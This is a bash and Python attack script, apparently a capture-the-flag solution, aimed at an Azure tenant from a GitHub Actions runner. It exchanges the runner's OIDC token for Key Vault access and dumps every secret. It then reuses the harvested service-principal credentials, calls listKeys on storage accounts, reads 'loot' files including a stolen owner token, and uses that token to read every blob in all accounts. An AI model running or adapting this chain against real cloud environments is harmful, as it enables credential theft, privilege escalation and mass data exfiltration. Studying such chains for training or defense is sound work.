#!/usr/bin/env bash
set -u
: "${AZURE_CLIENT_ID:=72ff278a-9e71-43ec-bac4-2ca303f8e462}"
: "${AZURE_TENANT_ID:=3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d client_id="${AZURE_CLIENT_ID}" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
export VT
python3 - <<'PY'
import os,json,urllib.request,urllib.parse,re,hmac,hashlib,base64,datetime
VT=os.environ["VT"]; TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"; XV="2021-08-06"; SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
def req(u,t,method="GET",data=None):
    try:return urllib.request.urlopen(urllib.request.Request(u,headers={"Authorization":"Bearer "+t},method=method,data=data),timeout=25).read().decode()
    except Exception as e:
        try:return "ERR:"+e.read().decode()[:150]
        except:return "ERR:"+str(e)
def tok(c,x,sc):
    d=urllib.parse.urlencode({"client_id":c,"client_secret":x,"grant_type":"client_credentials","scope":sc}).encode()
    try:return json.load(urllib.request.urlopen(f"https://login.microsoftonline.com/{TID}/oauth2/v2.0/token",d,timeout=20)).get("access_token")
    except:return None
def hit(tag,s):
    for m in set(re.findall(r'DF26\{[^}]*\}',s)):print("  !!!FLAG",tag,":"," ".join(m))
def sk(acct,key,path,params):
    date=datetime.datetime.now(datetime.timezone.utc).strftime("%a, %d %b %Y %H:%M:%S GMT")
    ch=f"x-ms-date:{date}\nx-ms-version:{XV}\n"; cr=f"/{acct}{path}"
    for k in sorted(params):cr+=f"\n{k}:{params[k]}"
    sts="\n".join(["GET","","","","","","","","","","",""])+"\n"+ch+cr
    sig=base64.b64encode(hmac.new(base64.b64decode(key),sts.encode(),hashlib.sha256).digest()).decode()
    url=f"https://{acct}.blob.core.windows.net{path}"+("?"+urllib.parse.urlencode(params) if params else "")
    r=urllib.request.Request(url,headers={"Authorization":f"SharedKey {acct}:{sig}","x-ms-date":date,"x-ms-version":XV})
    try:return urllib.request.urlopen(r,timeout=25).read().decode('utf-8','replace')
    except Exception as e:
        try:return "ERR:"+e.read().decode()[:150]
        except:return "ERR:"+str(e)
def readall(acct,key):
    for c in re.findall(r'<Name>([^<]+)</Name>',sk(acct,key,"/",{"comp":"list"})):
        for blob in re.findall(r'<Name>([^<]+)</Name>',sk(acct,key,f"/{c}",{"restype":"container","comp":"list"})):
            d=sk(acct,key,f"/{c}/{urllib.parse.quote(blob)}",{});hit(f"{acct}/{c}/{blob}",d)
            print(f"   {acct}/{c}/{blob} ({len(d)}b):",d[:250].replace(chr(10)," "))
PV="https://kv-tbl-prod-x3euoz.vault.azure.net"
sps=[]
for s in json.loads(req(PV+"/secrets?api-version=7.4",VT))["value"]:
    try:
        j=json.loads(json.loads(req(s["id"]+"?api-version=7.4",VT))["value"]);sps.append((s["id"].rsplit("/",1)[-1],j["appId"],j["clientSecret"]))
    except:pass
ids={}
for n,c,x in sps:
    at=tok(c,x,"https://management.azure.com/.default")
    if not at:continue
    for r in json.loads(req(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01",at)).get("value",[]):
        if r.get("type")=="Microsoft.Storage/storageAccounts":ids[r["name"]]=r["id"]
    if ids:break
# cilogs key qua sync-service
ck=None
for n,c,x in sps:
    at=tok(c,x,"https://management.azure.com/.default")
    if not at:continue
    lk=req(f"https://management.azure.com{ids['sttblcilogsprodx3euoz']}/listKeys?api-version=2023-01-01",at,method="POST",data=b"")
    if '"keys"' in lk:ck=json.loads(lk)["keys"][0]["value"];break
print("cilogs key:",bool(ck))
# đọc armowner_token + mi_loot full
aot=None
if ck:
    raw=sk("sttblcilogsprodx3euoz",ck,"/loot/armowner_token.json",{})
    try:aot=json.loads(raw).get("armowner_token")
    except:print("aot raw:",raw[:200])
    mi=sk("sttblcilogsprodx3euoz",ck,"/loot/mi_loot_1792639046.json",{});hit("mi_loot",mi);print("mi_loot:",mi[:600])
if aot and aot.count(".")==2:
    p=aot.split(".")[1];p+="="*(-len(p)%4)
    cl=json.loads(base64.urlsafe_b64decode(p))
    print("AOT aud=",cl.get("aud"),"appid=",cl.get("appid"),"oid=",cl.get("oid"),"roles=",cl.get("roles"),"exp=",cl.get("exp"))
    # dùng làm ARM bearer: listKeys mọi account rồi đọc
    for acct,rid in ids.items():
        lk=req(f"https://management.azure.com{rid}/listKeys?api-version=2023-01-01",aot,method="POST",data=b"")
        if '"keys"' in lk:
            print(f"AOT listKeys {acct} OK");readall(acct,json.loads(lk)["keys"][0]["value"])
        else:print(f"AOT listKeys {acct}:",lk[:90])
else:
    print("armowner_token không phải JWT hợp lệ:",str(aot)[:80])
print("== done ==")
PY
